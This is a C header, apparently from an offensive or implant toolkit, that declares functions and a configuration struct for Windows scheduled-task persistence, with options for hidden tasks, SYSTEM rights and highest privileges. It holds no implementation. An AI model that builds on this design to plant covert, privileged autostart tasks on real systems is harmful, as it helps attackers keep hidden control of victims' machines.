#pragma once

/*
 * PersistTask.h - Scheduled Task Persistence
 *
 * Provides scheduled task-based persistence mechanisms.
 * WARNING: Use only with explicit user consent for legitimate purposes.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// Task trigger types
typedef enum _TASK_TRIGGER_TYPE {
    TASK_TRIGGER_LOGON = 0,         // At logon
    TASK_TRIGGER_STARTUP = 1,       // At system startup
    TASK_TRIGGER_DAILY = 2,         // Daily
    TASK_TRIGGER_WEEKLY = 3,        // Weekly
    TASK_TRIGGER_ON_IDLE = 4        // On system idle
} TASK_TRIGGER_TYPE;

// Task configuration
typedef struct _TASK_PERSIST_CONFIG {
    LPCSTR taskName;                // Task name
    LPCSTR targetPath;              // Executable path
    LPCSTR arguments;               // Command line arguments
    LPCSTR description;             // Task description
    TASK_TRIGGER_TYPE triggerType;  // Trigger type
    DWORD delayMinutes;             // Delay in minutes
    DWORD intervalMinutes;          // Repeat interval (0 = no repeat)
    BOOL bRunAsSystem;              // Run as SYSTEM account
    BOOL bRunHighest;               // Run with highest privileges
    BOOL bHidden;                   // Hidden task
    BOOL bEnabled;                  // Task enabled
} TASK_PERSIST_CONFIG, *PTASK_PERSIST_CONFIG;

// Function declarations

/**
 * Install scheduled task persistence (at logon)
 * @param taskName Task name
 * @param targetPath Executable path
 * @param bRunHighest Run with highest privileges
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallTaskPersistLogon(LPCSTR taskName, LPCSTR targetPath, BOOL bRunHighest);

/**
 * Install scheduled task persistence (at startup - requires admin)
 * @param taskName Task name
 * @param targetPath Executable path
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallTaskPersistStartup(LPCSTR taskName, LPCSTR targetPath);

/**
 * Install scheduled task with full configuration
 * @param pConfig Task configuration
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InstallTaskPersistEx(PTASK_PERSIST_CONFIG pConfig);

/**
 * Remove scheduled task
 * @param taskName Task name to remove
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RemoveTaskPersist(LPCSTR taskName);

/**
 * Check if scheduled task exists
 * @param taskName Task name
 * @return TRUE if exists, FALSE otherwise
 */
BOOL CheckTaskExist(LPCSTR taskName);

/**
 * Run scheduled task immediately
 * @param taskName Task name
 * @return TRUE if successful, FALSE otherwise
 */
BOOL RunTaskPersist(LPCSTR taskName);

/**
 * Stop running task
 * @param taskName Task name
 * @return TRUE if successful, FALSE otherwise
 */
BOOL StopTaskPersist(LPCSTR taskName);

/**
 * Enable/disable scheduled task
 * @param taskName Task name
 * @param bEnable TRUE to enable, FALSE to disable
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SetTaskEnabled(LPCSTR taskName, BOOL bEnable);

/**
 * Query task status
 * @param taskName Task name
 * @param pState Output task state
 * @return TRUE if successful, FALSE otherwise
 */
BOOL QueryTaskStatus(LPCSTR taskName, DWORD* pState);